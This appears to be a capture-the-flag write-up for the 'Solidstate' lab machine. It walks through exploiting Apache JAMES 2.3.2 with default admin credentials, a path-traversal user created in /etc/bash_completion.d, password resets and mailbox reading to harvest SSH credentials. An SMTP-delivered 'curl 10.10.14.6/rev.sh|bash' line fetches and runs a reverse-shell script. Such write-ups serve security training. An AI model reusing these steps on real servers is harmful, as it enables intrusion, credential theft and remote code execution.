---
layout: default
---

# Solidstate

# Enumeration

IP → 10.10.10.51

Open ports

```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp    syn-ack JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.6 [10.10.14.6])
80/tcp   open  http    syn-ack Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp  open  pop3    syn-ack JAMES pop3d 2.3.2
119/tcp  open  nntp    syn-ack JAMES nntpd (posting ok)
4555/tcp open  rsip?   syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.94SVN%I=7%D=12/13%Time=6579B8A5%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2
SF:\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPa
SF:ssword:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can search in the web server but we won’t get nothing. A quicnck search for the version of JAMES gives us a Python script to gain a RCE.

# Foothold

We will follow all the steps to execute a command but manually. First we will connect to JAMES in port 4555 with the default credentials `root:root`.

 

```powershell
┌──(kali㉿kali)-[~/machines/linux/solidstate]
└─$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Once this is done, the scripts needs that a user connects to the machine via SSH to exploit the vulnerability, so we will search in all mails until we find something. We create a special user and change the password of the rest of the users.

```powershell
adduser ../../../../../../../../etc/bash_completion.d exploit
set password mindy mindy
```

Then we can connect from POP3 in port 110 to check the mail. In mindy mail we will find his credentials for SSH.

```powershell
┌──(kali㉿kali)-[~/machines/linux/solidstate]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER Mindy
+OK
pass mindy
-ERR Authentication failed.
USER mindy
+OK
pass mindy
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
RETR 2
<SNIP>
username: mindy
pass: P@55W0rd1!2@
```

Now we have to trigger a reverse shell, because although we gained access to the machine via SSH, it is a restricted environment.

```powershell
┌──(kali㉿kali)-[~/machines/linux/solidstate]
└─$ telnet 10.10.10.51 25 
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 13 Dec 2023 10:33:27 -0500 (EST)
HELO CEN
250 solidstate Hello CEN (10.10.14.6 [10.10.14.6])
mail from:<mindy>
250 2.1.0 Sender <mindy@localhost> OK
rcpt to:<../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
data 
354 Ok Send data ending with <CRLF>.<CRLF>
From: mindy@localhost
'
curl 10.10.14.6/rev.sh|bash
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
```

For priv esc there is a cron job we can abuse